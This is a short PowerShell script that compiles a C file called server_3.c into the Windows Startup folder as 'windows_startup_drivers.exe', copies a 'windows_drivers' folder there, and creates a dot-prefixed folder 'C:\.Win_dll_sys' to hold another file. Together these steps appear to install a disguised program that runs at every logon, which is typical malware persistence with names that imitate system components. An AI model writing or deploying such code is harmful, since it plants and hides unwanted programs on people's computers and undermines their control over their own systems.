
$destinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows_startup_drivers.exe"

gcc server_3.c -lwinmm -o $destinationPath2

$sourcePath = "windows_drivers"

Copy-Item -Path $sourcePath -Destination $destinationPath -Force -Recurse

# Get the home directory path for the current user
$homePath = [Environment]::GetFolderPath("UserProfile")
$homePath = "C:\"

# Specify the name of the folder you want to create
$folderName = ".Win_dll_sys"

# Combine the home directory path with the folder name
$folderPath = Join-Path -Path $homePath -ChildPath $folderName

# Check if the folder already exists, if not, create it
if (-not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
    Write-Host "Folder '$folderName' created successfully in $homePath."
} else {
    Write-Host "Folder '$folderName' already exists in $homePath."
}

$sourcePath = "maxresdefault.txt"
Copy-Item -Path $sourcePath -Destination $folderPath -Force -Recurse

